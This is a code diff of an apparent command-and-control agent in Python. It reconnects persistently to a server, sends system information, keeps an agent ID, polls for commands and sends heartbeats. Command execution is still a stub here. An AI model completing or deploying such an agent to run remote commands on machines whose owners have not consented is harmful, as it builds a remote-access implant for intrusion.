@@ -3,17 +3,16 @@ import sys
 import socket
 import json
 import time
-from data import connection_details
+from data import get_system_info
 
-SERVER_HOST: str = sys.argv[1]
-SERVER_PORT: int = int(sys.argv[2])
-BUFFER_SIZE: int = 1024
-SEPARATOR: str = "<sep>"
+SERVER_HOST = sys.argv[1]
+SERVER_PORT = int(sys.argv[2])
+BUFFER_SIZE = 1024
 AGENT_ID_FILENAME = "uuid.txt"
-SLEEP_INTERVAL: float = 100
-RECV_TIMEOUT = 10
+RECV_TIMEOUT = 50
+RETRY_CONNECT_INTERVAL = 5
 
-def get_uuid() -> str | None:
+def read_uuid() -> str | None:
 
     if os.path.exists(AGENT_ID_FILENAME):
         with open(AGENT_ID_FILENAME, "r") as f:
@@ -25,34 +24,60 @@ def get_uuid() -> str | None:
 
     return None
 
-def connect(s: socket.socket) -> None:
-    agent_id = get_uuid()
+def run_command(command: str) -> tuple[str, str]:
+    return "helllo", "/"
 
-    if agent_id is not None:
-        connection_details["agent_id"] = agent_id
+def communicate(s: socket.socket, initial_connection_info: dict) -> None:
 
-    data = json.dumps(connection_details)
-    s.send(data.encode())
+    # Read agent_id
+    agent_id = read_uuid()
+    if agent_id:
+        initial_connection_info["agent_id"] = agent_id
 
+    # Send system info
+    raw_data = json.dumps(initial_connection_info)
+    s.send(raw_data.encode())
+
+    # Receive
     agent_uid = json.loads(s.recv(BUFFER_SIZE).decode().strip())
+
+    # Save to file received agent_id
     with open(AGENT_ID_FILENAME, "w") as f:
         f.write(agent_uid)
 
     while True:
-        s.send(json.dumps(agent_uid).encode())
         try:
-            command = s.recv(BUFFER_SIZE)
-            if command:
-                pass
-        except socket.timeout:
-            pass
-        time.sleep(SLEEP_INTERVAL)
+            message = json.loads(s.recv(BUFFER_SIZE).decode())
+
+            response_tuple = run_command(message["command"])
+            response = {
+                "type": "command_response",
+                "command_id": message["command_id"],
+                "command_response": response_tuple[0],
+                "cwd":  response_tuple[1],
+            }
+            s.send(json.dumps(response).encode())
+
+        except socket.timeout:  # If socket timeout, send heartbeat
+            message = {
+                "type": "heartbeat",
+            }
+            s.send(json.dumps(message).encode())
+            print("Sent heartbeat")
+
+def connect_to_server(host: str, port: int) -> socket.socket:
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+            return s
+        except socket.error:
+            time.sleep(RETRY_CONNECT_INTERVAL)
 
 def main() -> None:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((SERVER_HOST, SERVER_PORT))
+    s = connect_to_server(SERVER_HOST, SERVER_PORT)
     s.settimeout(RECV_TIMEOUT)
-    connect(s)
+    communicate(s, get_system_info())
 
 if __name__ == '__main__':
     main()
